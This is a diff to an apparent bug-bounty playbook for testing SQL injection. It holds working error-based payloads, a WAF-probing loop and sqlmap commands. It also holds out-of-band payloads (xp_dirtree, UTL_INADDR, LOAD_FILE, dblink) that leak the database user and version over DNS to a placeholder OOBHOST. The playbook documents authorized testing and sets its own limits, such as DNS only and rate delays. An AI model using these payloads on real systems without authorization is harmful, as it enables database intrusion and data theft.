@@ -9,7 +9,7 @@
 |---|---|
 | **Class** | `sqli` |
 | **Applies when** | http, app\|api, params |
-| **Pays** | 338 disclosed reports, 85 paid, median $1,350, top $25,000. The best-paid were blind injections in ordinary parameters on secondary hosts (a partner reporting page, regional services, payment endpoints), several of them behind a WAF. |
+| **Pays** | 338 disclosed reports, 85 paid, median $1,350, top $25,000. The best-paid were blind injections in ordinary parameters on hosts other than the main product (a partner reporting page, sub-brand sites, payment endpoints); the top one also had to pass a WAF. |
 | **Weaknesses** | SQL Injection · Blind SQL Injection · CWE-89 |
 
 ## Why it pays
@@ -172,7 +172,7 @@ for injections with no visible effect) → SQL-014 (targeted sqlmap run for the 
   q() { curl -sS "${HDR[@]}" $A --get --data-urlencode "$P=$1" "$U" -o "$D/last.body" -w '%{http_code} %{size_download}  '; sleep 1
         grep -aoE "XPATH syntax error: '[^']*'|invalid input syntax for (type )?integer: \"[^\"]*\"|converting the n?varchar value '[^']*'|DRG-11701[^<]{0,120}|sql002:[^<\"]*" "$D/last.body" | head -3; echo; }
   # error-based (string context shown; drop the first ' when V sits in the statement as a number)
-  q "$V' AND extractvalue(1,concat(0x7e,version(),0x7e,current_user(),0x7e))-- -"     # MySQL, MariaDB: XPATH syntax error: '~8.0.36~app@10.0.3.7~'
+  q "$V' AND extractvalue(1,concat(0x7e,version(),0x7e,current_user(),0x7e))-- -"     # MySQL, MariaDB: XPATH syntax error: '~8.0.36~app@localhost~'
   q "$V' AND 1=CAST(version() AS int)-- -"                                           # PostgreSQL: invalid input syntax for type integer: "PostgreSQL 15.4 ..."
   q "$V' AND 1=CAST(current_user::text AS int)-- -"
   q "$V' AND 1=CONVERT(int,@@version)-- -"                                           # SQL Server: Conversion failed when converting the nvarchar value '...'
@@ -765,7 +765,7 @@ for injections with no visible effect) → SQL-014 (targeted sqlmap run for the 
   r --get --data-urlencode "nosuchfield=1" "$T/api/items/"                      # FieldError "Cannot resolve keyword ... Choices are": the keys are ORM lookups
   r --get --data-urlencode "data__a=1" "$T/api/items/"; r --get --data-urlencode "data__a'b=1" "$T/api/items/"   # data = a JSONField from the Choices list: empty list, then a database error
   r --get --data-urlencode "fields=data__a'b" "$T/api/items/"                   # the same key through values() or values_list() (#2646493)
-  r --get --data-urlencode "ordering=app_item.id" "$T/api/items/"               # app_item = the table (<app>_<model>); table.column accepted by order_by(): Django 3.1 and 3.2 before the July 2021 fix
+  r --get --data-urlencode "ordering=app_item.id" "$T/api/items/"               # app_item = the table (<app>_<model>); a dotted name accepted by order_by(): Django 3.1 and 3.2 before the July 2021 fix
   r --get --data-urlencode "ordering=app_item.$ORD_T" "$T/api/items/"; r --get --data-urlencode "ordering=app_item.$ORD_F" "$T/api/items/"
 
   # node (mysql and mysql2 drivers, Sequelize, knex, TypeORM)
@@ -834,7 +834,7 @@ for injections with no visible effect) → SQL-014 (targeted sqlmap run for the 
 - **How:**
   ```bash
   D="$E/evidence/$H/SQL-012"; mkdir -p "$D"; U="$T/item"; P=id; V=7
-  w() { curl -sS "${HDR[@]}" $A --get --data-urlencode "$P=$1" "$U" -o "$D/last.body" -w '%{http_code} %{size_download}  '; printf '%s\n' "$1" | tr '\n\t' '  '; sleep 2; }
+  w() { curl -sS "${HDR[@]}" $A --get --data-urlencode "$P=$1" "$U" -o "$D/last.body" -w '%{http_code} %{size_download}  '; printf '%s' "$1" | tr '\n\t' '  '; echo; sleep 2; }
   # 1. which token is blocked?
   for x in "$V'" "$V AND 1=1" "$V and 1=1" "$V UNION SELECT 1" "$V SLEEP(1)" "$V-- -" "$V/**/" "version()" "information_schema" "$((V+1))-1" "$V'||'"; do w "$x"; done | tee "$D/tokens.txt"
   # 2. the same condition, respelled one change at a time
@@ -892,9 +892,9 @@ for injections with no visible effect) → SQL-014 (targeted sqlmap run for the 
   job (SQL-008), headers written to a log table (SQL-007), statements whose timing is too noisy for SQL-004. It
   needs a database function that opens a network connection, which exists on SQL Server (any login may call
   `xp_dirtree`), Oracle (`UTL_INADDR`, subject to the network ACL), MySQL and MariaDB on Windows hosts only
-  (`LOAD_FILE` with a UNC path), and PostgreSQL only when the `dblink` extension is installed. No title in the
-  report library names this channel; the two reports cited are stacked blind injections, the setting where it is
-  used.
+  (`LOAD_FILE` with a UNC path, which needs the FILE privilege), and PostgreSQL only when the `dblink` extension
+  is installed. No title in the report library names this channel; the two reports cited are stacked blind
+  injections, the setting where it is used.
 - **Test:** make the database resolve `<hex of the value>.<label>.$OOB`. The value is hex-encoded and cut to 30
   bytes so that it fits a 63-character DNS label. DNS only: do not run an SMB or HTTP listener that captures the
   database host's authentication, and do not use functions that run operating-system commands (`xp_cmdshell`,
@@ -903,8 +903,8 @@ for injections with no visible effect) → SQL-014 (targeted sqlmap run for the 
   ```bash
   D="$E/evidence/$H/SQL-013"; mkdir -p "$D"; U="$T/api/track"; P=ref
   cat > "$D/payloads.txt" <<'EOF'
-  mssql: x'; DECLARE @q varchar(200); SET @q='\\'+CONVERT(varchar(60),CONVERT(varbinary(30),SYSTEM_USER),2)+'.u.sql013.OOBHOST\a'; EXEC master..xp_dirtree @q-- -
-  mssqlv: x'; DECLARE @q varchar(200); SET @q='\\'+CONVERT(varchar(60),CONVERT(varbinary(30),@@version),2)+'.v.sql013.OOBHOST\a'; EXEC master..xp_dirtree @q-- -
+  mssql: x'; DECLARE @q varchar(200); SET @q='\\'+CONVERT(varchar(60),CONVERT(varbinary(30),CONVERT(varchar(30),SYSTEM_USER)),2)+'.u.sql013.OOBHOST\a'; EXEC master..xp_dirtree @q-- -
+  mssqlv: x'; DECLARE @q varchar(200); SET @q='\\'+CONVERT(varchar(60),CONVERT(varbinary(30),CONVERT(varchar(30),@@version)),2)+'.v.sql013.OOBHOST\a'; EXEC master..xp_dirtree @q-- -
   oracle: x'||(SELECT UTL_INADDR.GET_HOST_ADDRESS(RAWTOHEX(UTL_RAW.CAST_TO_RAW(SUBSTR(user,1,30)))||'.u.sql013.OOBHOST') FROM dual)||'
   mysqlwin: x' AND LOAD_FILE(CONCAT('\\\\',HEX(SUBSTRING(current_user(),1,30)),'.u.sql013.OOBHOST\\a')) IS NULL-- -
   pgdblink: x'||(SELECT dblink_connect('host='||encode(convert_to(substring(current_user::text,1,30),'UTF8'),'hex')||'.u.sql013.OOBHOST user=a dbname=a connect_timeout=2'))||'
@@ -917,7 +917,7 @@ for injections with no visible effect) → SQL-014 (targeted sqlmap run for the 
   send mssql; send oracle; send mysqlwin; send pgdblink          # only the ones that fit the DBMS; mssqlv after mssql answers
   # read the interaction log (interactsh-client -json -o "$D/oob.json"), then decode the first label
   jq -r 'select(."full-id"|test("sql013")) | [.timestamp, ."remote-address", ."full-id"] | @tsv' "$D/oob.json"
-  echo 6170705f7573657240 | xxd -r -p; echo
+  echo 6170705f75736572 | xxd -r -p; echo                         # the first label of a hit, here "app_user"
   ```
   The payloads assume a quoted string context; for a stored value (SQL-008) or a header (SQL-007) put the same
   text where that item puts its payload. `xp_dirtree` and `IF`/`DECLARE` need a second statement, which SQL
@@ -963,10 +963,10 @@ for injections with no visible effect) → SQL-014 (targeted sqlmap run for the 
   # the request confirmed by hand, with the programme's headers and A's session, as a raw request file
   { echo "GET /api/items?id=7&page=1 HTTP/1.1"; echo "Host: $H"
     for i in "${!HDR[@]}"; do [ "${HDR[$i]}" = -A ] && echo "User-Agent: ${HDR[$((i+1))]}"; [ "${HDR[$i]}" = -H ] && echo "${HDR[$((i+1))]}"; done
-    cat "$E/accounts/A.headers"; echo "Accept: */*"; echo; } > "$D/req.txt"
+    grep . "$E/accounts/A.headers"; echo "Accept: */*"; echo; } > "$D/req.txt"
   OPTS=(-r "$D/req.txt" --force-ssl -p "$P" --batch --dbms=mysql --technique=B --level 1 --risk 1 --threads 1
-        --delay "$(awk "BEGIN{w=1/$RATE; print (w<1)?1:w}")" --timeout 15 --retries 1 --string='"total":1'
-        --output-dir "$D/sqlmap" -v 3)
+        --delay 1 --timeout 15 --retries 1 --string='"total":1' --output-dir "$D/sqlmap" -v 3)
+  # --delay is seconds between requests: 1, or more when 1/$RATE is more. Run this block as one command.
   sqlmap "${OPTS[@]}" --banner --current-user --current-db --is-dba 2>&1 | tee "$D/run1.log"
   # only after run 1 identified the point: table NAMES of the current database
   DB=$(grep -aoP "current database: '\K[^']+" "$D/run1.log" | tail -1)
